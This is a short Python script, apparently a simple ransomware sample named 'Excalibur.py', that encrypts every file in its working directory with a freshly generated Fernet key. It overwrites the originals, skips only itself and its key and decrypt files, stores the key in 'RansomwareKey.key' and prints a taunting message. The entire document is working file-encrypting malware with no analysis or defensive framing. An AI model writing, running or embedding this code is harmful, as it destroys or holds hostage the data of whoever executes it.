#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#find files to encrypt

files = []
for file in os.listdir():
	if file == "Excalibur.py" or file == "RansomwareKey.key" or file == "Decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print (files)

key = Fernet.generate_key()
with open("RansomwareKey.key","wb") as RansomwareKey:
	RansomwareKey.write(key) 

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open (file, "wb") as thefile:
		thefile.write(contents_encrypted)

print ("Oh, dang! I accidently encrypted all your files :(")
